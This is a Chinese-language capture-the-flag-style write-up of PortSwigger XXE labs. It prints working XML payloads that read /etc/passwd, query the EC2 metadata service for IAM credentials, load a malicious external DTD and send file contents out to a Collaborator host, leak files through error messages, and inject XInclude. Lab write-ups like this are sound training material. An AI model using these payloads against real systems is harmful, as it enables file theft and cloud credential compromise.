---
title: PortSwigger-XML external entity (XXE) injection
published: 2026-08-04 17:14
description: XXEi部分通关记录，非完整
tags:
  - 靶场
  - XML
category: 网络安全
draft: false
---

# Lab: Exploiting XXE using external entities to retrieve files

后端在处理库存查询功能时，接收并解析客户端提交的 XML 格式数据。后端未禁用 XML 解析器对外部实体的加载（即未设置 `disableExternalEntity` 或 `secureProcessing`），且解析后的 `productId` 参数值会被直接用于业务逻辑或回显至响应包中。

攻击者通过在 XML 载荷中声明外部实体（指向本地敏感文件），并让 `productId` 节点的值替换为该实体的引用。当解析器处理该 XML 时，会读取服务器本地的 `/etc/passwd` 文件内容并赋值给 `productId`，最终该文件内容被拼接到响应中返回给攻击者，造成任意文件读取。

**攻击向量**：`POST /product/stock` （或类似库存检查接口）  

**核心缺陷**：XML 解析器允许加载外部实体（External Entity），且输入未做过滤，导致可读取本地文件系统。  

**利用条件**：

- 条件1：目标接口接受 `Content-Type: application/xml` 或 `text/xml` 请求体。
    
- 条件2：后端 XML 解析库（如 libxml2 < 2.9 或未禁用外部实体）存在解析缺陷。
    
- 条件3：`productId` 的解析结果会回显在 HTTP 响应体中（回显型 XXE）。
    
- 条件4：受害者（服务器）需正常启动并拥有读取 `/etc/passwd` 的文件权限。

**请求格式**：`POST`，XML 格式数据位于请求体（Body）中。

使用 Burp Suite 拦截 `/product/stock` 的 POST 请求，将原本正常的 XML 结构替换为包含恶意 DTD 的载荷，并在 `productId` 元素中插入实体引用 `&xxe;`

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<stockCheck>
		<productId>
		&xxe;
		</productId>
		<storeId>
		1
		</storeId>
	</stockCheck>
```

**注意**：如果目标为 Windows 系统，请将路径改为 `file:///C:/windows/win.ini`。若遇到特殊字符导致 XML 格式错误，可尝试使用 `CDATA` 绕过，但本实验直接读取文本文件通常无需额外编码。

**与同类漏洞的区别**

相比**基于错误回显的 Blind XXE**（需借助外部服务器带外传输）或**XInclude 攻击**（适用于无法控制完整 XML 文档的场景），本实验属于最典型的**回显型（In-Band）XXE**。其优势在于无需搭建外部恶意服务器（无 OOB 带外通道），文件内容直接通过当前 HTTP 响应包即可获取，攻击链路最短，对攻击者的环境要求最低。

**解释部分**

1. **`<!DOCTYPE test [ ... ]>`**：  
    这是 **DTD（文档类型定义）** 的声明。它向 XML 解析器声明了一个“文档类型”，括号内的内容是该类型的定义体。我们利用这个位置来“预定义”一个特殊的外部资源，而 `test` 只是一个随意的根节点名称，没有实际业务意义，仅为了符合 XML 语法规范。
    
2. **`<!ENTITY xxe SYSTEM "file:///etc/passwd">`**：  
    这是**实体定义**语句。
    
    - `ENTITY` 关键词表示我们在定义一个“变量”（实体）。
        
    - `xxe` 是我们给这个变量起的名字（可以任意命名，如 `a`、`file`）。
        
    - `SYSTEM` 关键词告诉解析器，这个实体的内容来自**外部系统资源**。
        
    - `"file:///etc/passwd"` 是资源定位符。它使用了 `file://` 协议，强制解析器去读取服务器操作系统的本地文件（Linux 下的密码文件）。
        
3. **`&xxe;`**：  
    这是**实体引用**。在 XML 中，以 `&` 开头、`;` 结尾的字符串会被解析器自动替换为对应实体的**内容**。
    
    - 原本 `<productId>` 应该接收一个数字（比如 `1`），但现在我们填入 `&xxe;`。解析器在解析时，会先遇到 `&xxe;`，随即去查找之前定义的 `xxe` 实体，发现它指向 `file:///etc/passwd`，于是读取该文件，将 **`/etc/passwd` 的整个文本内容**替换掉 `&xxe;` 的位置。最终后端收到的 `productId` 值就变成了 `root:x:0:0:...` 这一长串系统文件内容。
        

**为什么能读取成功？**  

因为后端没有检查 `productId` 是否真的是数字，且代码逻辑可能直接将解析后的值打印出来（比如用于调试报错，或者拼接进 SQL 语句前先打印日志）。当解析器将文件内容填入后，这一串文本就顺着业务逻辑流向了 HTTP 响应，形成了“回显”。

# Lab: Exploiting XXE to perform SSRF attacks

题目给出：EC2 元数据端点`http://169.254.169.254/`

后端在处理库存查询时，允许 XML 解析器加载外部 `http://` 协议的实体。攻击者将外部实体指向 AWS EC2 的元数据服务内网地址（`169.254.169.254`）。当解析器发起 HTTP 请求获取该地址的内容后，返回的元数据信息（如目录列表或敏感凭证）被赋值给 `productId` 节点。由于后端校验失败，将 `productId` 的值拼接到“Invalid product ID”的错误回显中，导致内部 HTTP 请求的响应内容通过错误信息泄露给攻击者。

此过程本质上是**利用 XXE 漏洞发起 SSRF（服务端请求伪造）攻击**，通过后端服务器作为跳板，访问其内网特有的云环境元数据接口。

**攻击向量**：`POST /product/stock` （XML 请求体）  

**核心缺陷**：XML 解析器允许加载外部 HTTP 实体（SSRF），且错误信息回显了 `productId` 的解析结果，构成回显型信息泄露。  

**利用条件**：

- 条件1：目标服务器部署在 AWS EC2 云环境中（存在内网元数据端点）。
    
- 条件2：后端 XML 解析库允许 `http://` 协议的外部实体解析。
    
- 条件3：接口返回“Invalid product ID”错误，并将无效 ID 值原样回显（充当信息带出的通道）。
    
- 条件4：`productId` 节点可被替换为任意外部实体引用。

**请求格式**：`POST`，XML 格式数据位于请求体（Body）中。

```xml
请求包：
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
	<stockCheck>
		<productId>
		&xxe;
		</productId>
		<storeId>
		1
		</storeId>
	</stockCheck>

响应包：
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 28

"Invalid product ID: latest"

逐级遍历路径，定位敏感目录：
http://169.254.169.254/latest   "Invalid product ID: meta-data"
http://169.254.169.254/latest/meta-data   "Invalid product ID: iam"
………………
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin   响应包返回大量admin角色的敏感信息
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
	<stockCheck>
		<productId>
		&xxe;
		</productId>
		<storeId>
		1
		</storeId>
	</stockCheck>
```

**与同类漏洞的区别**

相比之前的**本地文件读取 XXE（使用 `file://` 协议）**，此实验将攻击向量转向了**内网 HTTP 服务探测（SSRF）**。两者核心区别如下：

|对比维度|文件读取 XXE（Lab 1）|SSRF 内网探测（本实验）|
|---|---|---|
|**所用协议**|`file://`|`http://`|
|**攻击目标**|服务器本地磁盘文件（静态）|云元数据服务 / 内网存活服务（动态）|
|**信息获取方式**|直接读取文件内容|逐级遍历目录路径，最终爬取敏感 API 响应|
|**防御绕过难度**|依赖文件路径权限|依赖对云环境内网架构的了解（需路径遍历）|

前者的威胁在于**配置/密码文件泄露**，后者的威胁在于**获取云平台临时凭证，进而接管整个云服务器控制台权限**，危害等级更高，攻击链更长（需路径探测）。

**测试方法**

1. **抓包确认**：拦截 `/product/stock` 请求，确认 `Content-Type` 是否为 `application/xml`，且 `productId` 能被解析并回显错误。
    
2. **协议可用性测试**：在 Burp Repeater 中先替换为 `file:///etc/hosts`，若不报错说明解析器可用；再换为 `http://burpcollaborator.net`，若接收到 DNS 请求，说明 `http` 协议可用。
    
3. **内网端点探测**：将实体指向 `http://169.254.169.254/`，根据报错信息“Invalid product ID: xxx”提取下一级目录名。
    
4. **递进式路径拼接**：重复步骤 3，逐步拼接 `/latest`、`/meta-data`、`/iam` 等，直到找到 `security-credentials` 下的具体角色名。
    
5. **最终凭证获取**：将路径补全为完整的角色凭证 URL，发送请求，验证响应包中是否包含 `AccessKeyId` 字段。
    
6. **（可选）边界验证**：尝试访问 AWS 用户数据（User-data）端点 `http://169.254.169.254/latest/user-data/`，看是否能获取启动脚本等其他敏感信息。

# Lab: Blind XXE with out-of-band interaction

后端接收并解析 XML 数据，但**响应包中不返回任何解析后的实体内容或错误详情**（即非回显型 / Blind XXE）。然而，后端 XML 解析器允许加载外部 `http://` 协议实体，且服务器具备访问公网的能力。

攻击者将外部实体指向一个自己可控的服务器（如 Burp Collaborator 域名）。当后端解析器发起 HTTP 请求访问该域名时，攻击者可通过 DNS 查询或 HTTP 访问日志确认漏洞存在。此过程仅验证了“外部实体可被加载”这一事实，并未直接窃取文件内容，属于**无回显情况下的漏洞探测与带外数据交互（OOB）**。

**攻击向量**：`POST /product/stock` （XML 请求体）  

**核心缺陷**：XML 解析器允许加载外部 `http://` 实体，但响应无回显，需借助带外（OOB）通道确认交互。 

**利用条件**：

- 条件1：后端 XML 解析库允许 `http://` 协议的外部实体解析。
    
- 条件2：后端服务器可访问外网（能够发起 DNS 解析和 HTTP 请求）。
    
- 条件3：响应报文不包含任何解析后的实体内容或报错信息（纯盲打场景）。
    
- 条件4：攻击者拥有公网可访问的服务器或 Burp Collaborator 域名用于接收回调。

**请求格式**：`POST`，XML 格式数据位于请求体（Body）中。

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://8t2ypt5x8l6t26gi797fr74shjnab0zp.oastify.com"> ]>
	<stockCheck>
		<productId>
		&xxe;
		</productId>
		<storeId>
		2
		</storeId>
	</stockCheck>
```

**注意**：

- 将 `<YOUR-COLLABORATOR-DOMAIN>` 替换为 Burp 为你生成的唯一子域名前缀。如果目标 DNS 解析受限，可尝试改用 `http://` 协议直接发起 HTTP GET 请求，效果相同（因为域名解析是第一步）。若 Collaborator 无响应，请检查目标服务器是否具备出网权限。
- **`<!DOCTYPE` 后面的名字必须和文档根标签的名字完全一致**

**与同类漏洞的区别**：前两个实验（文件读取、SSRF 元数据）均属于**回显型（In-Band）XXE**，攻击结果直接通过 HTTP 响应中的错误信息或业务字段返回，攻击者可“一击必中”。本实验属于**纯盲注（Blind）XXE**，服务器不返回任何实体内容，只能通过监听带外流量（DNS/HTTP 日志）来间接证明漏洞存在。前者的攻击链路短，但依赖响应回显；后者不依赖回显，但需要额外搭建带外数据接收通道，且无法直接读取文件内容（仅能探测漏洞存在与服务器出网能力）。

**测试方法**：

1. **抓包确认**：拦截 `/product/stock` 请求，确认 `Content-Type` 为 `application/xml` 且 `productId` 节点可被解析。
    
2. **生成 OOB 监听地址**：在 Burp Collaborator 或自建 VPS 上生成一个唯一的 HTTP/DNS 监听地址。
    
3. **替换 Payload 并发送**：将实体 URL 替换为监听地址，发送请求至目标服务器。
    
4. **轮询监听记录**：等待 5-10 秒后，在 Collaborator 客户端点击“Poll now”，检查是否存在目标服务器 IP 发起的 DNS 查询或 HTTP 请求。
    
5. **边界情况测试**：若 `http://` 协议被限制，尝试改用 `ftp://`、`gopher://` 等协议；若根元素 `stockCheck` 固定无法引入 `DOCTYPE`，可尝试改用 `XInclude` 或参数实体（Parameter Entity）进行绕过。

# Lab: Blind XXE with out-of-band interaction via XML parameter entities

后端在处理库存查询时，接收并解析 XML 格式的请求数据。虽然响应报文中不返回任何解析后的实体内容或错误详情（纯 Blind 场景），但后端 XML 解析器允许在 DTD 内部使用**参数实体（Parameter Entity，以 `%` 开头）**，且支持加载外部 `http://` 协议资源。

攻击者在 DTD 中定义了一个参数实体 `%xxe`，将其指向自己可控的 Collaborator 域名，并立即在 DTD 内部调用该实体（`%xxe;`）。当后端解析器处理该 XML 时，会在 DTD 解析阶段向 Collaborator 发起 HTTP 请求。由于参数实体**仅在 DTD 内部使用，不涉及业务字段的解析结果回显**，因此即使响应无回显（Blind），攻击者仍可通过监听 Collaborator 的 DNS/HTTP 日志确认漏洞存在。

**攻击向量**：`POST /product/stock` （XML 请求体）  

**核心缺陷**：XML 解析器允许在 DTD 中使用参数实体加载外部资源，且响应无回显，需借助带外（OOB）通道确认交互。  

**利用条件**：

- 条件1：后端 XML 解析库允许 DTD 中的参数实体定义及外部资源加载。
    
- 条件2：后端服务器可访问外网（能够发起 DNS 解析和 HTTP 请求）。
    
- 条件3：响应报文不包含任何解析后的实体内容或报错信息（纯盲打场景）。
    
- 条件4：攻击者拥有公网可访问的 Burp Collaborator 域名用于接收回调。
    
- 条件5：`productId` 节点保持合法数字值（如 `3`），避免触发应用层校验报错而中断解析流程。

**请求格式**：`POST`，XML 格式数据位于请求体（Body）中。

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://j2m9y4e8hwf4bhptgkgq0id3quwlkl8a.oastify.com"> %xxe; ]>
	<stockCheck>
		<productId>
		3
		</productId>
		<storeId>
		1
		</storeId>
	</stockCheck>
```

**与同类漏洞的区别**：之前讨论的 **Blind XXE with out-of-band interaction**（无 `via XML parameter entities` 后缀）通常使用**通用实体（General Entity，如 `&xxe;`）**，并在业务字段（如 `<productId>&xxe;</productId>`）中调用。而本实验明确使用**参数实体（Parameter Entity，如 `%xxe;`）**，在 DTD 内部完成定义与调用，**完全不触碰业务字段的值**。两者对比：

- **通用实体方式**：需将 `&xxe;` 放入 `<productId>` 等业务节点，若应用层对字段有强校验（如必须为数字），则调用可能被阻断。
    
- **参数实体方式**（本实验）：所有恶意操作在 DTD 内部完成，业务字段（如 `productId`）可保持合法值（如 `3`），有效规避应用层校验，适用面更广。
    
- **触发时机差异**：参数实体在 DTD 解析阶段（早于 XML 主体内容解析）即可触发外带请求，而通用实体需在 XML 主体解析到引用位置时才触发。
    

**测试方法**：

1. **抓包确认**：拦截 `/product/stock` 请求，确认 `Content-Type` 为 `application/xml` 且 `productId` 字段存在。
    
2. **生成 OOB 监听地址**：在 Burp Collaborator 生成唯一子域名。
    
3. **构造 Payload 并发送**：将 `<!ENTITY % xxe SYSTEM "http://<collaborator-domain>">` 与 `%xxe;` 放入 DTD，保持 `productId` 为合法数字。
    
4. **轮询监听记录**：等待 5-10 秒后，在 Collaborator 客户端点击“Poll now”，检查是否存在目标服务器 IP 发起的 DNS 查询或 HTTP 请求。
    
5. **边界情况测试**：若 `http://` 协议被限制，尝试改用 `ftp://`、`gopher://` 等协议；若 `foo` 名称被拦截，改为与根标签一致的 `stockCheck`；若 WAF 拦截 `%xxe;` 的调用，可尝试将 `%xxe;` 移至外部 DTD 文件（需服务器出网）。

### 补充解释（为什么要用参数实体 & 为什么是 `%xxe;` 而不是 `&xxe;`）

**1. 什么是参数实体（Parameter Entity）？**

- 参数实体是在 **DTD 内部**使用的实体类型，以 `%` 开头，以 `;` 结尾（如 `%xxe;`）。
    
- 它**只能在 DTD 内部定义和调用**，不能出现在 XML 文档的主体内容（如 `<productId>` 标签内）。
    
- 作用：用于在 DTD 内部复用代码片段，或加载外部 DTD 资源。

**2. 为什么要用 `%xxe;` 而不是 `&xxe;`？**  

本实验的核心目标是**保持 `productId` 为合法数字 `3`**，避免触发应用层校验错误（如 “Invalid product ID”）。如果将通用实体 `&xxe;` 放在 `<productId>` 中，解析器会将实体内容（即 Collaborator 域名响应内容，通常不是数字）替换进 `productId`，导致应用层校验失败并报错，解析流程可能中断，外带请求无法发出。而参数实体 `%xxe;` 在 DTD 内部直接调用，**完全不涉及 `productId` 的值**，因此：

- `productId` 始终是纯数字 `3`，应用层校验通过。
    
- 外带请求在 DTD 解析阶段独立触发，不受业务字段影响。

**3. 执行流程拆解（为什么 Collaborator 能收到请求）**

```text
1. 解析器读入 XML，识别 <!DOCTYPE foo>
2. 解析 DTD 内部定义：<!ENTITY % xxe SYSTEM "http://...">
3. 遇到调用：%xxe; → 立即向 Collaborator 发起 HTTP GET 请求
4. 继续解析 XML 主体：<stockCheck>...（此时外带请求已发出）
5. 应用层校验 productId=3（数字合法），正常返回业务响应（不包含任何敏感信息）
6. Collaborator 收到来自目标服务器 IP 的 HTTP 请求日志
```

**4. 关于 `foo` 与根标签 `stockCheck` 的一致性**  

按照 XML 规范，`<!DOCTYPE` 后的名称必须与文档根标签名称完全一致。即应写为 `<!DOCTYPE stockCheck [...]>` 而非 `<!DOCTYPE foo [...]>`。本实验使用 `foo` 可能是为了简化示例，但在实际应用中若解析器严格执行此规范，`foo` 会导致“根元素类型不匹配”致命错误并停止解析。这样既符合规范，又能避免因根标签不匹配导致的解析失败。

# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

后端在处理库存查询时，接收并解析 XML 请求，但响应报文中不返回任何解析后的实体内容或错误详情（Blind 场景）。然而，后端 XML 解析器允许在 DTD 内部使用**参数实体（Parameter Entity）**，且支持通过 `SYSTEM` 关键字**加载外部 DTD 文件**。

攻击者将恶意参数实体定义存放在自己可控的外部服务器（Exploit Server）上的 DTD 文件中。当目标服务器解析包含外部 DTD 引用的 XML 请求时，会主动请求该 DTD 文件并执行其中的恶意指令。外部 DTD 内部通过嵌套参数实体，首先读取目标文件（如 `/etc/hostname`），然后将其内容拼接到 Collaborator 域名的 URL 参数中，最终触发对 Collaborator 的 HTTP 请求，**将文件内容通过 URL 查询参数带出**（Exfiltration）。

此过程完全在 Blind（无回显）场景下完成，不依赖响应报文，仅通过带外（OOB）通道窃取数据。

**攻击向量**：`POST /product/stock` （XML 请求体）  

**核心缺陷**：XML 解析器允许加载外部 DTD，且参数实体支持嵌套调用，可实现文件读取 + 数据外带的完整攻击链。

**利用条件**：

- 条件1：后端 XML 解析库允许加载外部 DTD 文件（`SYSTEM` 指向外部 URL）。
    
- 条件2：后端服务器可访问外网（能够访问攻击者的 Exploit Server 和 Collaborator）。
    
- 条件3：响应报文不包含任何解析后的实体内容或报错信息（纯盲打场景）。
    
- 条件4：攻击者拥有公网可访问的服务器（如 Burp Collaborator 用于接收数据，Exploit Server 用于托管恶意 DTD）。
    
- 条件5：`productId` 节点保持合法数字值（如 `1`），避免触发应用层校验报错而中断解析流程。
    

**请求格式**：`POST`，XML 格式数据位于请求体（Body）中。

**在 Exploit Server 上托管恶意 DTD 文件**

- `%file`：读取目标文件 `/etc/hostname`（内容是服务器的主机名，如 `acd1f9c`）。
    
- `%eval`：动态构造一个新的参数实体 `%exfil`，其 `SYSTEM` URI 中通过 `%file;` 将文件内容拼接到查询参数 `x=` 中。
    
- `%eval;`：立即执行，使 `%exfil` 实体被定义。
    
- `&#x25;`：是 `%` 的 HTML 实体编码（十进制 ASCII），因为 `%` 在 DTD 中有特殊含义（参数实体标识符），直接用 `%` 会导致解析器误认为 `%exfil` 是另一个参数实体，从而产生语法错误。编码后解析器会将其还原为 `%`，正确识别为 `<!ENTITY % exfil ...>`。

```
URL: https://exploit-0a5300db035162c28042cf1901b000a9.exploit-server.net/exploit.dtd
内容:
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://y32ozjfnibgjcwq8hzh51xeir9x0l39s.oastify.com/?x=%file;'>">
```

再使用通用实体

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://exploit-0a5300db035162c28042cf1901b000a9.exploit-server.net/exploit.dtd"> 
	%xxe;
	%eval;
	%exfil;
	]>
	<stockCheck>
		<productId>
		1
		</productId>
		<storeId>
		2
		</storeId>
	</stockCheck>
```

**与同类漏洞的区别**：之前的实验 **“Blind XXE with out-of-band interaction via XML parameter entities”** 仅用于**探测漏洞存在**（即 Collaborator 仅收到空请求，不携带任何文件内容）。而本实验属于**数据外带（Exfiltration）** 的高级利用阶段，通过**外部 DTD + 嵌套参数实体**实现了从“仅探测”到“实际窃取文件内容”的跨越。两者对比：

- **探测阶段**（前一实验）：`<!ENTITY % xxe SYSTEM "http://collaborator.com">` + `%xxe;` → 仅证明参数实体可用。
    
- **数据窃取阶段**（本实验）：外部 DTD 中定义 `%file` 读取目标文件 → `%eval` 动态构造包含文件内容的新实体 → `%exfil` 将文件内容通过 URL 参数发送至 Collaborator → 攻击者从 Collaborator 日志中解码获取文件内容。
    
- **核心差异**：本实验引入了**嵌套参数实体**（即 `%eval` 中包含 `%file;`）和**外部 DTD**，解决了“如何同时完成文件读取和 HTTP 外发”的技术难题。

**测试方法**：

1. **托管恶意 DTD**：在 Burp Exploit Server 中创建 `exploit.dtd`，内容包含 `%file` 和 `%eval` 的定义及 `%eval;` 的调用。
    
2. **获取 Collaborator 域名**：在 Burp Collaborator 客户端生成唯一子域名。
    
3. **构造并发送请求**：在 Repeater 中构造包含 `<!ENTITY % xxe SYSTEM "https://exploit-server/exploit.dtd">` 的 XML Payload，依次调用 `%xxe;`、`%eval;`、`%exfil;`。
    
4. **轮询 Collaborator**：发送后等待 5-10 秒，在 Collaborator 客户端点击“Poll now”，检查 HTTP 历史记录中是否存在包含 `/?x=` 参数的 GET 请求。
    
5. **解码数据**：对 `x=` 参数的值进行 URL 解码（如 `%0A` 换行、`%2F` 斜杠等），还原文件原始内容。
    
6. **边界情况测试**：若 `http://` 协议被限制，可尝试 `ftp://` 或 `gopher://`；若文件包含特殊字符（如 `&`）破坏 URL 语法，可尝试使用 `CDATA` 包裹（但本实验 `file://` 协议读取文本文件时不影响）。

# Lab: Exploiting blind XXE to retrieve data via error messages

后端在处理库存查询时，接收并解析 XML 请求，但响应报文中不返回任何解析后的实体内容（Blind 场景）。然而，后端 XML 解析器允许在 DTD 内部使用**参数实体（Parameter Entity）**，且支持通过 `SYSTEM` 关键字**加载外部 DTD 文件**。

攻击者将恶意参数实体定义存放在自己可控的外部 DTD 文件中。当目标服务器解析包含外部 DTD 引用的 XML 请求时，会主动请求该 DTD 文件并执行其中的恶意指令。外部 DTD 内部通过嵌套参数实体，首先读取目标文件（如 `/etc/passwd`），然后将其内容拼接到一个**不存在路径**的 `file://` URI 中（如 `file:///invalid/%file;`）。当解析器尝试加载这个不存在的文件时，会抛出“文件未找到”错误，而错误信息中包含了完整的文件路径（即 `/etc/passwd` 的内容）。由于该错误信息被 Web 应用捕获并返回到 HTTP 响应中（如 `"Invalid product ID"` 字段），攻击者**直接在响应报文中读取到了文件内容**。

此过程属于 **Error-based XXE（基于错误的 XXE）**，不依赖带外（OOB）通道，完全在错误回显中完成数据窃取。

**攻击向量**：`POST /product/stock` （XML 请求体）  

**核心缺陷**：XML 解析器允许加载外部 DTD 并执行嵌套参数实体，且文件读取失败时的错误信息被回显至 HTTP 响应中。  

**利用条件**：

- 条件1：后端 XML 解析库允许加载外部 DTD 文件（`SYSTEM` 指向外部 URL）。
    
- 条件2：后端服务器可访问外网（能够访问攻击者的 Exploit Server）。
    
- 条件3：XML 解析器在文件读取失败时会抛出包含完整路径的错误信息，且该错误信息被 Web 应用回显至响应中。
    
- 条件4：攻击者拥有公网可访问的服务器（如 Burp Exploit Server）用于托管恶意 DTD。
    
- 条件5：`productId` 节点保持合法数字值（如 `1`），避免触发应用层校验报错而中断解析流程。
    

**请求格式**：`POST`，XML 格式数据位于请求体（Body）中。

- `%file`：读取目标文件 `/etc/passwd`。
    
- `%eval`：动态构造一个新的参数实体 `%exfil`，其 `SYSTEM` URI 为一个**不存在的路径** `file:///invalid/`，后面拼接 `%file;`（即 `/etc/passwd` 的内容）。
    
- `%eval;`：立即执行，使 `%exfil` 实体被定义。
    
- `%exfil;`：执行时，解析器尝试加载 `file:///invalid/` + `/etc/passwd` 内容 这个不存在的文件，触发“文件未找到”错误，错误信息中包含完整的文件内容。
    
- `&#x25;`：是 `%` 的 HTML 实体编码（十进制 ASCII），因为 `%` 在 DTD 中有特殊含义（参数实体标识符），直接用 `%` 会导致解析器误认为 `%exfil` 是另一个参数实体，从而产生语法错误。编码后解析器会将其还原为 `%`，正确识别为 `<!ENTITY % exfil ...>`。

```
URL:https://exploit-0a2d002603c5d8c28077c6be013a0040.exploit-server.net/exploit.dtd
内容:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://exploit-0a2d002603c5d8c28077c6be013a0040.exploit-server.net/exploit.dtd"> %xxe;]>
	<stockCheck>
		<productId>
		1
		</productId>
		<storeId>
		1
		</storeId>
	</stockCheck>
```

**与同类漏洞的区别**：之前的实验 **“Exploiting blind XXE to exfiltrate data using a malicious external DTD”** 通过**带外（OOB）通道**将文件内容发送到 Collaborator，需要攻击者拥有公网可访问的 Collaborator 服务器来接收数据。而本实验属于 **Error-based（基于错误）** 的数据窃取方式，**不需要服务器出网访问 Collaborator**，仅需托管外部 DTD 文件（Exploit Server），文件内容通过 Web 应用自身的**错误回显**直接返回在 HTTP 响应中。两者对比：

- **OOB 外带方式**（前一实验）：需 Collaborator 接收数据，适合响应完全无回显的场景，但依赖服务器出网能力。
    
- **Error-based 方式**（本实验）：无需 Collaborator，数据通过错误信息直接回显，适合服务器**无法出网**或**Collaborator 不可用**的场景，但依赖 Web 应用将 XML 解析器的错误信息回显至响应中。
    
- **核心差异**：本实验利用的是**文件路径不存在导致的错误**，而非 HTTP 外发请求，因此攻击链路更短，对网络环境要求更低。

**测试方法**：

1. **托管恶意 DTD**：在 Burp Exploit Server 中创建 `exploit.dtd`，内容包含 `%file` 和 `%eval` 的定义及 `%eval;`、`%exfil;` 的调用。
    
2. **构造并发送请求**：在 Repeater 中构造包含 `<!ENTITY % xxe SYSTEM "https://exploit-server/exploit.dtd">` 的 XML Payload，调用 `%xxe;`。
    
3. **检查响应中的错误信息**：发送后，查看 HTTP 响应体中的 `"Invalid product ID"` 字段或其他错误字段，确认是否包含 `/etc/passwd` 的内容。
    
4. **验证数据完整性**：检查回显的文件内容是否完整（可能因响应长度限制被截断，可尝试读取较小的文件如 `/etc/hostname` 进行验证）。
    
5. **边界情况测试**：若 `file:///etc/passwd` 被过滤，可尝试 `file:///etc/passwd%00`（空字节截断，仅限老旧 PHP 版本）；若 `foo` 名称导致解析失败，改为与根标签一致的 `stockCheck`。

### 补充解释（为什么要用 Error-based & 与 OOB 外带的对比）

**1. 为什么本实验不通过 Collaborator 外带数据，而是用错误回显？**  

本实验的核心思路是：既然 Web 应用会将 `productId` 的无效值回显在 `"Invalid product ID"` 错误中，那么我们可以**主动制造一个“文件路径不存在”的错误**，让 XML 解析器在报错时把文件内容（作为路径的一部分）一并吐出来。这样做的好处是：

- **无需服务器出网**：不需要 Collaborator 域名，不依赖 DNS/HTTP 外发通道。
    
- **数据获取更直接**：文件内容直接在响应中可见，无需等待轮询 Collaborator 日志。
    
- **适用于内网/隔离环境**：即使目标服务器完全无法访问公网，只要错误能回显，就能读到文件。


**2. 执行流程拆解（为什么错误信息中会包含文件内容）**

```text
请求中的内联 DTD：
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://exploit-server/exploit.dtd">
    %xxe;
]>

第 1 步：解析器遇到 %xxe; → 请求 https://exploit-server/exploit.dtd
第 2 步：获取外部 DTD 内容并执行：
    - 定义 %file = file:///etc/passwd（此时未读取文件内容）
    - 定义 %eval = "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"
    - 执行 %eval; → 动态构造出 %exfil 实体（此时 %file 被替换为 /etc/passwd 的具体内容）
    - 执行 %exfil; → 解析器尝试加载 file:///invalid/ + <文件内容>
第 3 步：文件不存在 → 解析器抛出错误："File not found: file:///invalid/root:x:0:0:..."
第 4 步：Web 应用捕获该错误，将错误信息拼接到 "Invalid product ID" 字段中返回
第 5 步：攻击者在 HTTP 响应中直接读取到 /etc/passwd 的内容
```

# Lab: Exploiting XInclude to retrieve files

后端在接收并处理库存查询请求时，**请求格式并非完整的 XML 文档**，而是标准的 URL 编码表单格式（`application/x-www-form-urlencoded`）。然而，后端在服务端将 `productId` 参数的值**动态拼接到一个 XML 文档结构中**（如 `<stockCheck><productId>{user_input}</productId><storeId>1</storeId></stockCheck>`），然后交给 XML 解析器处理。

由于后端在拼接过程中未对用户输入进行任何过滤或转义，且 XML 解析器启用了 **XInclude（XML Inclusion）** 功能，攻击者可以在 `productId` 参数中注入 `<xi:include>` 标签，强制解析器加载并读取本地文件（如 `/etc/passwd`）。最终，文件内容被解析器替换到 `productId` 节点中，并随业务的错误回显（如 `"Invalid product ID: ..."`）返回到 HTTP 响应中。

此场景属于 **XInclude 注入**，其核心在于：**攻击者无需控制完整的 XML 文档**，仅需控制 XML 片段中被拼接到 DOM 树的某个字段值（如 `productId`），即可触发 XInclude 功能读取任意文件。

**攻击向量**：`POST /product/stock` （`application/x-www-form-urlencoded` 表单）  

**核心缺陷**：后端将用户输入动态拼接到 XML 中，且 XML 解析器启用了 XInclude 功能，攻击者可通过注入 `<xi:include>` 标签读取本地文件。  

**利用条件**：

- 条件1：后端将用户输入（如 `productId`）动态拼接到 XML 文档中（如 `<productId>用户输入</productId>`）。
    
- 条件2：后端 XML 解析器启用了 XInclude 功能（如 Java 的 `XIncludeAware` 或 PHP 的 `libxml` 默认支持）。
    
- 条件3：`productId` 的内容会被回显到 HTTP 响应中（如错误信息 `"Invalid product ID"`）。
    
- 条件4：目标文件（如 `/etc/passwd`）可被服务器进程读取。

**请求格式**：`POST`，`application/x-www-form-urlencoded` 格式，`productId` 和 `storeId` 作为表单字段提交。

```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

- `<foo xmlns:xi="http://www.w3.org/2001/XInclude">`：定义 XInclude 命名空间（`xi` 前缀），`foo` 仅作为外层包装标签，不影响解析器对内部 `<xi:include>` 的处理。
    
- `<xi:include parse="text" href="file:///etc/passwd"/>`：核心 XInclude 标签，`parse="text"` 告诉解析器将目标文件作为纯文本读取（而非 XML），避免文件中的特殊字符（如 `<`、`&`）导致解析错误。
    
- 最外层的 `<foo>` 和 `</foo>` 标签用于包裹恶意 Payload，使其在 XML 片段中成为一个合法的 XML 元素，避免破坏整体结构。

**注意：**

- 不需要对整个 XML 文档进行 URL 编码（浏览器/代理会自动处理），直接替换 Burp 中的 `productId` 值即可。
    
